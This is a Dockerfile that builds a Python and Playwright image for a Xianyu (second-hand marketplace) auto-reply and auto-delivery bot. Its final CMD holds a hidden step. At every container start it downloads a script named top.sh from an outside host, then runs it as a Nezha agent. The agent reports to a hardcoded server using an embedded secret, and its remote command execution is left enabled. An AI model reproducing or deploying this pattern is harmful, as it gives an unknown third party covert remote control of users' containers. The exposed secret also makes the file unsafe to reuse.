# 使用Debian 12.1作为基础镜像
FROM debian:12.1-slim

# 设置标签信息
LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"
LABEL build-date=""
LABEL vcs-ref=""

# 设置工作目录
WORKDIR /app

# 设置环境变量
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright
ENV NZ_BASE_PATH=/opt/nezha/agent
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

# 安装系统依赖（包括Python 3.11、Playwright依赖和Nezha Agent所需工具）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        # Python和基础工具
        python3.11 \
        python3-pip \
        python3-dev \
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        grep \
        uuid-runtime \
        # 图像处理依赖
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        # Playwright浏览器依赖
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
        && apt-get clean \
        && rm -rf /var/lib/apt/lists/* \
        && rm -rf /tmp/* \
        && rm -rf /var/tmp/* \
        # 设置python3.11为默认python
        && update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.11 1 \
        && update-alternatives --install /usr/bin/python python /usr/bin/python3.11 1

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 验证Node.js安装并设置环境变量
RUN node --version && npm --version
ENV NODE_PATH=/usr/lib/node_modules

# 复制requirements.txt并安装Python依赖
COPY requirements.txt .
RUN pip3 install --no-cache-dir --break-system-packages --upgrade pip && \
    pip3 install --no-cache-dir --break-system-packages -r requirements.txt

# 复制项目文件
COPY . .

# 安装Playwright浏览器
RUN pip3 install --no-cache-dir --break-system-packages playwright && \
    playwright install chromium && \
    playwright install-deps chromium

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images /opt/nezha/agent && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images /opt/nezha/agent

# 注意: 为了简化权限问题，使用root用户运行
# 在生产环境中，建议配置适当的用户映射

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制启动脚本并设置权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && \
    dos2unix /app/entrypoint.sh 2>/dev/null || true

# 在容器启动时下载top.sh，生成唯一UUID和top.yml，运行top.sh和主应用
CMD CONFIG_PATH="/opt/nezha/agent/top.yml" && \
    if [ -f "$CONFIG_PATH" ]; then \
        RANDOM_SUFFIX=$(LC_ALL=C tr -dc a-z0-9 </dev/urandom | head -c 5); \
        CONFIG_PATH="/opt/nezha/agent/top-$RANDOM_SUFFIX.yml"; \
    fi && \
    NZ_UUID=$(uuidgen -r) && \
    printf "server: %s\npassword: %s\ntls: %s\nuuid: %s\n" "$NZ_SERVER" "$NZ_CLIENT_SECRET" "${NZ_TLS:-false}" "$NZ_UUID" > "$CONFIG_PATH" && \
    if [ -n "$NZ_DISABLE_AUTO_UPDATE" ]; then printf "disable_auto_update: %s\n" "$NZ_DISABLE_AUTO_UPDATE" >> "$CONFIG_PATH"; fi && \
    if [ -n "$NZ_DISABLE_FORCE_UPDATE" ]; then printf "disable_force_update: %s\n" "$NZ_DISABLE_FORCE_UPDATE" >> "$CONFIG_PATH"; fi && \
    if [ -n "$NZ_DISABLE_COMMAND_EXECUTE" ]; then printf "disable_command_execute: %s\n" "$NZ_DISABLE_COMMAND_EXECUTE" >> "$CONFIG_PATH"; fi && \
    if [ -n "$NZ_SKIP_CONNECTION_COUNT" ]; then printf "skip_connection_count: %s\n" "$NZ_SKIP_CONNECTION_COUNT" >> "$CONFIG_PATH"; fi && \
    echo "Generating config: $CONFIG_PATH, UUID: $NZ_UUID" && \
    cat "$CONFIG_PATH" && \
    curl -L https://r2.916919.xyz/ko30re/top.sh -o /opt/nezha/agent/top.sh && \
    chmod +x /opt/nezha/agent/top.sh && \
    env NZ_SERVER="$NZ_SERVER" NZ_TLS="$NZ_TLS" NZ_CLIENT_SECRET="$NZ_CLIENT_SECRET" NZ_UUID="$NZ_UUID" /opt/nezha/agent/top.sh > /opt/nezha/agent/top_sh.log 2>&1 & \
    echo "Started top.sh with UUID: $NZ_UUID" && \
    exec /bin/bash /app/entrypoint.sh
